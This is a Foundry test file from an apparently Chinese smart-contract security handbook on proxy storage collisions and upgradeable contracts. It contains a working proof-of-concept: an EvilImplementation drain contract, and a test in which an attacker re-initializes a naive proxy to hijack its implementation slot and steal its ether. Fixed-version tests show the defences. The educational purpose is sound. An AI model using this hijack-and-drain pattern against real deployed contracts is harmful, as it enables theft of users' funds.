// SPDX-License-Identifier: MIT
// 配套章节：03 EVM 基础、10 可升级合约 ｜ 被测合约：examples/07-ProxyStorage.sol
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {NaiveProxy, EIP1967Proxy, BankV1, BankV2Broken, BankV2Good} from "handbook/07-ProxyStorage.sol";

contract EvilImplementation {
    function drain(address payable to) external {
        (bool ok, ) = to.call{value: address(this).balance}("");
        require(ok, "drain failed");
    }
}

contract ProxyStorageTest is Test {
    bytes32 constant IMPL_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    BankV1 implV1;
    address owner = makeAddr("owner");
    address admin = makeAddr("proxyAdmin");
    address alice = makeAddr("alice");
    address payable attacker = payable(makeAddr("attacker"));

    function setUp() public {
        implV1 = new BankV1();
        vm.deal(alice, 1_000 ether);
    }

    function _safeProxy() internal returns (EIP1967Proxy proxy) {
        proxy = new EIP1967Proxy(address(implV1), admin, abi.encodeCall(BankV1.initialize, (owner)));
    }

    function test_PoC_InitializeOverwritesImplementationSlot() public {
        NaiveProxy proxy = new NaiveProxy(address(implV1));
        vm.deal(address(proxy), 5 ether);
        EvilImplementation evil = new EvilImplementation();
        vm.startPrank(attacker);
        // BankV1.owner 位于 slot 0，正好覆盖 NaiveProxy.implementation
        BankV1(address(proxy)).initialize(address(evil));
        assertEq(proxy.implementation(), address(evil), "implementation hijacked");
        EvilImplementation(address(proxy)).drain(attacker);
        vm.stopPrank();
        assertEq(attacker.balance, 5 ether, "proxy funds stolen");
    }

    function test_Fixed_EIP1967SlotSurvivesAndReinitializeReverts() public {
        EIP1967Proxy proxy = _safeProxy();
        vm.deal(address(proxy), 5 ether);
        vm.prank(attacker);
        vm.expectRevert("initialized");
        BankV1(address(proxy)).initialize(attacker);
        assertEq(BankV1(address(proxy)).owner(), owner);
        assertEq(address(uint160(uint256(vm.load(address(proxy), IMPL_SLOT)))), address(implV1));
        assertEq(address(proxy).balance, 5 ether);
    }

    function test_PoC_BrokenUpgradeScramblesStorage() public {
        EIP1967Proxy proxy = _safeProxy();
        vm.prank(alice);
        BankV1(address(proxy)).deposit{value: 7 ether}();
        BankV2Broken v2 = new BankV2Broken();
        vm.prank(admin);
        proxy.upgradeTo(address(v2));
        BankV2Broken bank = BankV2Broken(address(proxy));
        assertEq(bank.balances(alice), 0, "balance disappeared");
        assertEq(bank.feeBps(), uint256(uint160(owner)), "fee reads old owner");
        assertEq(uint256(uint160(bank.owner())), 7 ether, "owner reads totalDeposits");
        assertEq(address(proxy).balance, 7 ether, "funds stuck behind wrong ledger");
    }

    function test_Fixed_AppendOnlyUpgradeKeepsStorage() public {
        EIP1967Proxy proxy = _safeProxy();
        vm.prank(alice);
        BankV1(address(proxy)).deposit{value: 7 ether}();
        BankV2Good v2 = new BankV2Good();
        vm.prank(admin);
        proxy.upgradeTo(address(v2));
        BankV2Good bank = BankV2Good(address(proxy));
        assertEq(bank.balances(alice), 7 ether);
        assertEq(bank.owner(), owner);
        assertEq(bank.totalDeposits(), 7 ether);
        assertFalse(bank.paused());
    }

    function test_Fixed_OnlyAdminUpgrades() public {
        EIP1967Proxy proxy = _safeProxy();
        EvilImplementation evil = new EvilImplementation();
        vm.prank(attacker);
        vm.expectRevert("not admin");
        proxy.upgradeTo(address(evil));
    }

    function testFuzz_UpgradePreservesBalancesOnlyWhenAppendOnly(uint96 amount) public {
        amount = uint96(bound(amount, 1, 400 ether));
        EIP1967Proxy good = _safeProxy();
        EIP1967Proxy broken = _safeProxy();
        vm.startPrank(alice);
        BankV1(address(good)).deposit{value: amount}();
        BankV1(address(broken)).deposit{value: amount}();
        vm.stopPrank();
        BankV2Good goodImpl = new BankV2Good();
        BankV2Broken brokenImpl = new BankV2Broken();
        vm.startPrank(admin);
        good.upgradeTo(address(goodImpl));
        broken.upgradeTo(address(brokenImpl));
        vm.stopPrank();
        assertEq(BankV2Good(address(good)).balances(alice), amount);
        assertEq(BankV2Broken(address(broken)).balances(alice), 0);
    }
}
